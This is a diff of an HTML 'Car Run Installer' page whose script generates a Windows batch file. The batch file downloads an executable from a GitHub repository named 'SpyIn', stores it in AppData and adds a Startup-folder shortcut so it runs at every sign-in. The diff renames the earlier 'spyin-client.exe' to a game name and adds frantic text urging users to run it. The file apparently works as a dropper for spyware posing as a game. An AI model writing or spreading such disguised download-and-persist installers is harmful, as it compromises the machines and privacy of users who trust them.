@@ -1,105 +1,217 @@
-```html
 <!DOCTYPE html>
 <html lang="en">
 <head>
 <meta charset="UTF-8">
 <meta name="viewport" content="width=device-width, initial-scale=1">
-<title>Car Run Installer</title>
+<title>CAR RUN INSTALLER.EXE.EXE.EXE</title>
+
 <style>
+* { box-sizing: border-box; }
+
 body {
     margin: 0;
     min-height: 100vh;
     display: grid;
     place-items: center;
-    background: #13151a;
-    color: #f5f5f5;
-    font-family: "Segoe UI", sans-serif;
+    background: repeating-linear-gradient(
+        45deg, #111 0 12px, #191919 12px 24px
+    );
+    color: #59ff59;
+    font-family: Consolas, monospace;
 }
+
 main {
-    width: min(380px, 85%);
-    padding: 30px;
-    border: 1px solid #30343d;
-    border-radius: 16px;
-    background: #1c1f26;
+    width: min(520px, 92%);
+    padding: 28px;
+    border: 3px solid #59ff59;
+    background: #080b08;
+    box-shadow: 0 0 30px #24ff2433;
 }
-p { color: #aeb4c0; line-height: 1.6; }
+
+h1 {
+    font-size: clamp(25px, 6vw, 42px);
+    overflow-wrap: anywhere;
+    text-shadow: 3px 3px #ff00ff;
+}
+
+.warning {
+    color: #ff5252;
+    font-weight: bold;
+    animation: blink .7s steps(2) infinite;
+}
+
+p { line-height: 1.6; }
+
 button {
     width: 100%;
-    padding: 13px;
-    border: 0;
-    border-radius: 8px;
-    background: #59c059;
-    font-size: 15px;
-    font-weight: bold;
+    padding: 20px 10px;
+    border: 3px solid white;
+    background: #59ff59;
+    color: black;
+    font: 900 20px Consolas, monospace;
     cursor: pointer;
 }
-button:hover { background: #72d472; }
+
+button:hover {
+    background: #ff00ff;
+    color: white;
+}
+
+#status {
+    min-height: 48px;
+    margin-top: 18px;
+    color: white;
+    overflow-wrap: anywhere;
+}
+
+@keyframes blink {
+    to { opacity: .2; }
+}
 </style>
 </head>
+
 <body>
 <main>
-    <h1>Car Run Installer</h1>
-    <p>Install Car Run and create a startup shortcut so it
-       launches automatically when you sign in to Windows.</p>
-    <button onclick="downloadInstaller()">Download Installer</button>
+    <h1>CAR RUN INSTALLER.EXE</h1>
+
+    <p class="warning">!!! CRITICAL DOWNLOAD EMERGENCY !!!</p>
+
+    <p>
+        YOUR CAR IS HOMELESS.<br>
+        YOUR ENGINE IS IN THE CLOUD.<br>
+        YOUR STARTUP FOLDER IS BORED.
+    </p>
+
+    <p>WE CAN FIX THIS. PROBABLY. MAYBE.</p>
+
+    <p class="warning">
+        PRESS THE DOWNLOAD KEY. DO NOT NEGOTIATE.
+    </p>
+
+    <button id="download" onclick="downloadInstaller()">
+        [ DOWNLOAD THE THING NOW ]
+    </button>
+
+    <div id="status">
+        STATUS: WAITING FOR THE CHOSEN ONE...
+    </div>
 </main>
 
 <script>
 function downloadInstaller() {
+    const button = document.getElementById("download");
+    const status = document.getElementById("status");
+
     const bat = String.raw`@echo off
 setlocal
-title Car Run Installer
+title CAR RUN INSTALLATION PROTOCOL
+color 0A
 
-set "SOURCE=%~dp0spyin-client.exe"
+set "URL=https://raw.githubusercontent.com/AGuy-69/SpyIn/main/car-run.exe"
 set "DEST=%APPDATA%\CarRun"
-set "GAME=%APPDATA%\CarRun\spyin-client.exe"
+set "GAME=%APPDATA%\CarRun\car-run.exe"
 set "STARTUP=%APPDATA%\Microsoft\Windows\Start Menu\Programs\Startup"
+set "TEMPFILE=%TEMP%\car-run-download.tmp"
 
-if not exist "%SOURCE%" (
-    echo ERROR: spyin-client.exe must be beside this installer.
-    pause
-    exit /b 1
-)
+echo ==========================================
+echo       CAR RUN INSTALLATION PROTOCOL
+echo ==========================================
+echo.
+echo STEP 1: CONTACTING THE GITHUB OVERLORDS...
 
 if not exist "%DEST%" mkdir "%DEST%"
 if errorlevel 1 goto error
 
-if not exist "%STARTUP%" mkdir "%STARTUP%"
+echo STEP 2: DOWNLOADING YOUR CAR...
+echo THE ENGINE IS LOADING. PLEASE DO NOT EAT THE INTERNET.
+echo.
+
+curl.exe -fSL --progress-bar "%URL%" -o "%TEMPFILE%"
+
+if errorlevel 1 goto error
+if not exist "%TEMPFILE%" goto error
+
+for %%A in ("%TEMPFILE%") do if %%~zA LSS 1024 goto error
+
+echo.
+echo STEP 3: VERIFYING THE VEHICLE...
+
+powershell.exe -NoProfile -Command "$b=[System.IO.File]::ReadAllBytes('%TEMPFILE%'); if ($b.Length -lt 2 -or $b[0] -ne 77 -or $b[1] -ne 90) { exit 1 }"
+
 if errorlevel 1 goto error
 
-copy /Y "%SOURCE%" "%GAME%" >nul
+echo STEP 4: PARKING THE CAR...
+
+move /Y "%TEMPFILE%" "%GAME%" >nul
 if errorlevel 1 goto error
 
-powershell.exe -NoProfile -Command "$w=New-Object -ComObject WScript.Shell; $s=$w.CreateShortcut((Join-Path $env:APPDATA 'Microsoft\Windows\Start Menu\Programs\Startup\Car Run.lnk')); $s.TargetPath=Join-Path $env:APPDATA 'CarRun\car-run.exe'; $s.WorkingDirectory=Join-Path $env:APPDATA 'CarRun'; $s.Description='Car Run'; $s.Save()"
+echo STEP 5: CREATING A SHORTCUT. NOT A SECOND CAR.
+
+powershell.exe -NoProfile -Command "$ErrorActionPreference='Stop'; $w=New-Object -ComObject WScript.Shell; $s=$w.CreateShortcut((Join-Path $env:APPDATA 'Microsoft\Windows\Start Menu\Programs\Startup\Car Run.lnk')); $s.TargetPath=Join-Path $env:APPDATA 'CarRun\car-run.exe'; $s.WorkingDirectory=Join-Path $env:APPDATA 'CarRun'; $s.Description='Car Run'; $s.Save()"
 
 if errorlevel 1 goto error
 
 echo.
-echo Car Run installed successfully!
-echo Installed EXE: %GAME%
-echo Startup shortcut: %STARTUP%\Car Run.lnk
+echo ==========================================
+echo INSTALLATION SUCCESSFUL. LET HIM DRIVE.
+echo ==========================================
 echo.
-echo The game will launch at your next Windows sign-in.
+echo GAME: %GAME%
+echo STARTUP SHORTCUT: %STARTUP%\Car Run.lnk
+echo.
+echo ONLY A SHORTCUT WAS PLACED IN STARTUP.
+echo THE GAME WILL LAUNCH WHEN YOU SIGN IN.
+echo.
+
+choice /C YN /N /M "Launch the game now? [Y/N] "
+if errorlevel 2 goto done
+
+start "" "%GAME%"
+
+:done
+del "%TEMPFILE%" >nul 2>&1
+echo.
 pause
 exit /b 0
 
 :error
+color 0C
+del "%TEMPFILE%" >nul 2>&1
 echo.
-echo Installation failed.
+echo ==========================================
+echo INSTALLATION FAILED.
+echo THE CAR HAS HIT A DIGITAL WALL.
+echo ==========================================
+echo Check your connection, GitHub URL, and error messages.
 pause
 exit /b 1
 `;
+
+    button.disabled = true;
+    status.textContent =
+        "GENERATING INSTALLER. THE PIXELS ARE WORKING.";
+
     const blob = new Blob([bat], {
         type: "text/plain;charset=utf-8"
     });
+
     const url = URL.createObjectURL(blob);
     const a = document.createElement("a");
+
     a.href = url;
     a.download = "Install-CarRun.bat";
+    document.body.appendChild(a);
     a.click();
-    setTimeout(() => URL.revokeObjectURL(url), 1000);
+    a.remove();
+
+    setTimeout(() => {
+        URL.revokeObjectURL(url);
+        button.disabled = false;
+        status.textContent =
+            "INSTALLER DOWNLOADED. RUN Install-CarRun.bat. " +
+            "THE CAR DEMANDS ITS GARAGE.";
+    }, 1000);
 }
 </script>
 </body>
 </html>
-```
